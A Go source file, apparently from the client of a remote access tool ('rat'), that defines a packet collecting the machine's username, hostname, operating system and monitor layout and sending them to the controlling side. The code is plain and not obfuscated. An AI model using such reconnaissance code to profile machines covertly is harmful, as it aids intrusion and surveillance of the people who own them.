package main

import (
	"encoding/gob"
	"io"
	"rat/client/computer"
	"rat/client/screen"
	"rat/shared"
	"rat/shared/network/header"

	"github.com/wille/osutil"
)

type ComputerInfoPacket struct {
	Username        string
	Hostname        string
	OperatingSystem struct {
		Type    string
		Display string
	} `os`
	Monitors []shared.Monitor
}

func (packet ComputerInfoPacket) Header() header.PacketHeader {
	return header.ComputerInfoHeader
}

func (packet ComputerInfoPacket) Write(w io.ReadWriter, c *Connection) error {
	u := computer.GetComputerInformation()

	packet.Username = u.Username
	packet.Hostname = u.Hostname
	packet.OperatingSystem.Type = osutil.Name
	packet.OperatingSystem.Display = osutil.GetDisplay()

	screen.QueryMonitors()
	packet.Monitors = screen.Monitors

	enc := gob.NewEncoder(w)
	return enc.Encode(&packet)
}
